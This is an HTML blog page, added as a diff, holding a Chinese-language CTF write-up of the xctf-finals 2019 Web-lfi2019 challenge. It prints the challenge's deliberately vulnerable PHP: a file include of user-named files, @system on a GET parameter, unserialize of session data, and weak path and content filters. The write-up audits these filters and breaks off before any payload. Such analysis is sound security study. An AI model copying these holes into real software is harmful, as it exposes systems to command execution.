@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019 - 欢迎来玩哦!
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 4.2.0"></head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#审计源码"><span class="toc-text">审计源码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-实现put-get功能的代码"><span class="toc-text">1)实现put,get功能的代码:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-get功能块"><span class="toc-text">2)get功能块:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-put功能块"><span class="toc-text">3)put功能块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-过滤函数"><span class="toc-text">4)过滤函数:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-还有这段代码"><span class="toc-text">5)还有这段代码:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-分析put要过滤的点"><span class="toc-text">2.分析put要过滤的点</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">1eng</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">1eng</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/1eng" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="2469133675" target="_block">
+              <span class="iconfont icon-QQ"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2020/05/05</span>
+        </span>
+
+        
+          <span class="item leancloud-visitors" id="/CTF/2/" data-flag-title="代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/CTF">CTF</a>
+                
+              
+          </span>
+        </span>
+        
+        
+        
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h1 id="审计源码">审计源码<a class="post-anchor" href="#审计源码"></a></h1><p>意思就是让上传个马,然后包含过去读flag</p>
+<p>要把一些无关紧要的代码略过</p>
+<h2 id="1-实现put-get功能的代码">1)实现put,get功能的代码:<a class="post-anchor" href="#1-实现put-get功能的代码"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$parsed_url = explode("&", $_SERVER['QUERY_STRING']);</span><br><span class="line"></span><br><span class="line">  if(count($parsed_url) >= 2){</span><br><span class="line"></span><br><span class="line">​    header("Content-Type:text/json");</span><br><span class="line"></span><br><span class="line">​    switch($parsed_url[0]){</span><br><span class="line"></span><br><span class="line">​      case "get":</span><br><span class="line"></span><br><span class="line">​        $get = new Get($parsed_url[1]);</span><br><span class="line"></span><br><span class="line">​        $data = $get->get();</span><br><span class="line"></span><br><span class="line">​        break;</span><br><span class="line"></span><br><span class="line">​      case "put":</span><br><span class="line"></span><br><span class="line">​        $put = new Put($parsed_url[1], $_POST);</span><br><span class="line"></span><br><span class="line">​        $data = $put->put();</span><br><span class="line"></span><br><span class="line">​        break;</span><br><span class="line"></span><br><span class="line">​      default:</span><br><span class="line"></span><br><span class="line">​        $data = ["msg" => "Invalid data."];</span><br><span class="line"></span><br><span class="line">​        break;</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    die(json_encode($data));</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="2-get功能块">2)get功能块:<a class="post-anchor" href="#2-get功能块"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">class Get {</span><br><span class="line"></span><br><span class="line">​    protected function nanahira(){</span><br><span class="line"></span><br><span class="line">​      // senpai notice me //</span><br><span class="line"></span><br><span class="line">​      function exploit($data){</span><br><span class="line"></span><br><span class="line">​        $exploit = new System();</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    private $filename;</span><br><span class="line"></span><br><span class="line">​    function __construct($filename){</span><br><span class="line"></span><br><span class="line">​      $this->filename = path_sanitizer($filename);</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    function get(){</span><br><span class="line"></span><br><span class="line">​      if($this->filename === false){</span><br><span class="line"></span><br><span class="line">​        return ["msg" => "blocked by path sanitizer", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      // wtf???? //</span><br><span class="line"></span><br><span class="line">​      if(!@file_exists($this->filename)){</span><br><span class="line"></span><br><span class="line">​        // index files are *completely* disabled. //</span><br><span class="line"></span><br><span class="line">​        if(stripos($this->filename, "index") !== false){</span><br><span class="line"></span><br><span class="line">​          return ["msg" => "you cannot include index files!", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​        }</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​        // hardened sanitizer spawned. thus we sense ambiguity //</span><br><span class="line"></span><br><span class="line">​        $read_file = "./files/" . $this->filename;</span><br><span class="line"></span><br><span class="line">​        $read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​        if($read_file === $read_file_with_hardened_filter ||</span><br><span class="line"></span><br><span class="line">​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){</span><br><span class="line"></span><br><span class="line">​          return ["msg" => "request blocked", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​        }</span><br><span class="line"></span><br><span class="line">​        // .. and finally, include *un*exploitable file is included. //</span><br><span class="line"></span><br><span class="line">​        @include("./files/" . $this->filename);</span><br><span class="line"></span><br><span class="line">​        return ["type" => "success"];</span><br><span class="line"></span><br><span class="line">​      }else{</span><br><span class="line"></span><br><span class="line">​        return ["msg" => "invalid filename (wtf)", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="3-put功能块">3)put功能块<a class="post-anchor" href="#3-put功能块"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">class Put {</span><br><span class="line"></span><br><span class="line">​    protected function nanahira(){</span><br><span class="line"></span><br><span class="line">​      // senpai notice me //</span><br><span class="line"></span><br><span class="line">​      function exploit($data){</span><br><span class="line"></span><br><span class="line">​        $exploit = new System();</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      $_GET['trigger'] && !@@@@@@@@@@@@@exploit($$$$$$_GET['leak']['leak']);</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    private $filename;</span><br><span class="line"></span><br><span class="line">​    private $content;</span><br><span class="line"></span><br><span class="line">​    private $dir = "./files/";</span><br><span class="line"></span><br><span class="line">​    function __construct($filename, $data){</span><br><span class="line"></span><br><span class="line">​      global $seed;</span><br><span class="line"></span><br><span class="line">​      if((string)$filename === (string)@path_sanitizer($data['filename'])){</span><br><span class="line"></span><br><span class="line">​        $this->filename = (string)$filename;</span><br><span class="line"></span><br><span class="line">​      }else{</span><br><span class="line"></span><br><span class="line">​        $this->filename = false;</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      $this->content = (string)@code_sanitizer($data['content']);</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    function put(){</span><br><span class="line"></span><br><span class="line">​      // just another typical file insertion //</span><br><span class="line"></span><br><span class="line">​      if($this->filename === false){</span><br><span class="line"></span><br><span class="line">​        return ["msg" => "blocked by path sanitizer", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      // check if file exists //</span><br><span class="line"></span><br><span class="line">​      if(file_exists($this->dir . $this->filename)){</span><br><span class="line"></span><br><span class="line">​        return ["msg" => "file exists", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      file_put_contents($this->dir . $this->filename, $this->content);</span><br><span class="line"></span><br><span class="line">​      // just check if file is written. hopefully. //</span><br><span class="line"></span><br><span class="line">​      if(@file_get_contents($this->dir . $this->filename) == ""){</span><br><span class="line"></span><br><span class="line">​        return ["msg" => "file not written.", "type" => "error"];</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​      return ["type" => "success"];</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="4-过滤函数">4)过滤函数:<a class="post-anchor" href="#4-过滤函数"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"> function rrmdir($dir, $depth=0){ </span><br><span class="line"></span><br><span class="line">​    if (is_dir($dir)){</span><br><span class="line"></span><br><span class="line">​      $objects = scandir($dir); </span><br><span class="line"></span><br><span class="line">​      foreach ($objects as $object){ </span><br><span class="line"></span><br><span class="line">​        if ($object != "." && $object != ".."){ </span><br><span class="line"></span><br><span class="line">​          if(is_dir($dir."/".$object))</span><br><span class="line"></span><br><span class="line">​            rrmdir($dir."/".$object, $depth + 1);</span><br><span class="line"></span><br><span class="line">​          else</span><br><span class="line"></span><br><span class="line">​            unlink($dir."/".$object); </span><br><span class="line"></span><br><span class="line">​        }</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    if($depth != 0) rmdir($dir); </span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  function countdir($dir){</span><br><span class="line"></span><br><span class="line">​    if (is_dir($dir)){</span><br><span class="line"></span><br><span class="line">​      $objects = scandir($dir);</span><br><span class="line"></span><br><span class="line">​      foreach ($objects as $object){ </span><br><span class="line"></span><br><span class="line">​        if ($object != "." && $object != ".."){ </span><br><span class="line"></span><br><span class="line">​          $count += 1;</span><br><span class="line"></span><br><span class="line">​          if(is_dir($dir."/".$object))</span><br><span class="line"></span><br><span class="line">​            $count += countdir($dir."/".$object);</span><br><span class="line"></span><br><span class="line">​        }</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    return $count;</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  var_dump(countdir("./files"));</span><br><span class="line"></span><br><span class="line">  if(countdir("./files/") >= 100) @rrmdir("./files/");</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // Here, kawaii path-san for you! //</span><br><span class="line"></span><br><span class="line">  function path_sanitizer($dir, $harden=false){</span><br><span class="line"></span><br><span class="line">​    $dir = (string)$dir;</span><br><span class="line"></span><br><span class="line">​    $dir_len = strlen($dir);</span><br><span class="line"></span><br><span class="line">​    // Deny LFI/RFI/XSS //</span><br><span class="line"></span><br><span class="line">​    $filter = ['.', './', '~', '.\\', '#', '<', '>'];</span><br><span class="line"></span><br><span class="line">​    foreach($filter as $f){</span><br><span class="line"></span><br><span class="line">​      if(stripos($dir, $f) !== false){</span><br><span class="line"></span><br><span class="line">​        return false;</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    // Deny SSRF and all possible weird bypasses //</span><br><span class="line"></span><br><span class="line">​    $stream = stream_get_wrappers();</span><br><span class="line"></span><br><span class="line">​    $stream = array_merge($stream, stream_get_transports());</span><br><span class="line"></span><br><span class="line">​    $stream = array_merge($stream, stream_get_filters());</span><br><span class="line"></span><br><span class="line">​    foreach($stream as $f){</span><br><span class="line"></span><br><span class="line">​      $f_len = strlen($f);</span><br><span class="line"></span><br><span class="line">​      if(substr($dir, 0, $f_len) === $f){</span><br><span class="line"></span><br><span class="line">​        return false;</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    // Deny length //</span><br><span class="line"></span><br><span class="line">​    if($dir_len >= 128){</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">​    // Easy level hardening //</span><br><span class="line"></span><br><span class="line">​    if($harden){</span><br><span class="line"></span><br><span class="line">​      $harden_filter = ["/", "\\"];</span><br><span class="line"></span><br><span class="line">​      foreach($harden_filter as $f){</span><br><span class="line"></span><br><span class="line">​        $dir = str_replace($f, "", $dir);</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">​    // Sanitize feature is available starting from the medium level //</span><br><span class="line"></span><br><span class="line">​    return $dir;</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // The new kakkoii code-san is re-implemented. //</span><br><span class="line"></span><br><span class="line">  function code_sanitizer($code){</span><br><span class="line"></span><br><span class="line">​    // Computer-chan, please don't speak english. Speak something else! //</span><br><span class="line"></span><br><span class="line">​    $code = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);</span><br><span class="line"></span><br><span class="line">​    return $code;</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="5-还有这段代码">5)还有这段代码:<a class="post-anchor" href="#5-还有这段代码"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@require('flag.php');</span><br><span class="line"></span><br><span class="line">$seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if($flag === $_GET['trigger']){</span><br><span class="line"></span><br><span class="line">​    die(hash("sha256", $seed . $flag));</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">class System {</span><br><span class="line"></span><br><span class="line">​    function __destruct(){</span><br><span class="line"></span><br><span class="line">​      global $seed;</span><br><span class="line"></span><br><span class="line">​      // ain't Argon2, ain't pbkdf2. what could go wrong?</span><br><span class="line"></span><br><span class="line">​      $flag = hash('sha256', $seed);</span><br><span class="line"></span><br><span class="line">​      if($_GET[$flag]){</span><br><span class="line"></span><br><span class="line">​        @system($_GET[$flag]);</span><br><span class="line"></span><br><span class="line">​      }else{</span><br><span class="line"></span><br><span class="line">​        @unserialize($_SESSION[$flag]);</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>这里是迷惑点,拿不到flag</p>
+<h1 id="2-分析put要过滤的点">2.分析put要过滤的点<a class="post-anchor" href="#2-分析put要过滤的点"></a></h1><p>首先这个条件成立才能put文件</p>
+<p><code>if((string)$filename === (string)@path_sanitizer($data['filename']))</code></p>
+<p>文件名不能包含这些符号</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$filter = ['.', './', '~', '.\\', '#', '<', '>'];</span><br><span class="line"></span><br><span class="line">​    foreach($filter as $f){</span><br><span class="line"></span><br><span class="line">​      if(stripos($dir, $f) !== false){</span><br><span class="line"></span><br><span class="line">​        return false;</span><br><span class="line"></span><br><span class="line">​      }</span><br><span class="line"></span><br><span class="line">​    }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>长度限制:</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if($dir_len >= 128){</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">​    }</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>content的限制:</p>
+<p><code>$code = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);</code></p>
+<p><a href="/CTF/2/1.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/1.png" alt="1"></a></p>
+<p>本地测试下:</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=@$_POST[a];</span><br><span class="line"></span><br><span class="line">//$a = preg_replace("/[^<>!@#$%\^&*\_?]/u", "h", $a);</span><br><span class="line"></span><br><span class="line">$a = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "h", $a);</span><br><span class="line"></span><br><span class="line">echo $a;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p> <a href="/CTF/2/2.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/2.png" alt="1"></a></p>
+<p>多了四个 hhhh  输入的字符没有被替换 怎么多了四个hhhh?</p>
+<p>发现</p>
